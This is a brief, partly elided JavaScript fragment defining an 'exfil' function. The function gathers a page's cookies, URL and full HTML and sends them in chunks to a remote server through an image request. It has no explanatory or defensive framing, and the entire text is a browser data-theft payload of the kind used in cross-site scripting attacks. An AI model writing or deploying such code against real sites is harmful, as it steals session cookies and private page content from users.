...
function exfil() {
  var payload = export_cookie() + ":" + export_url() + ":" + export_html() + ":EOF";
  ...
  {
    console.log("Chunk: "+ i + " of "+ (numberOfChunks+1));
  ...
  downloadImage.src = url+"exfil?num="+numberOfChunks+ "&chunk="+remainder;
}
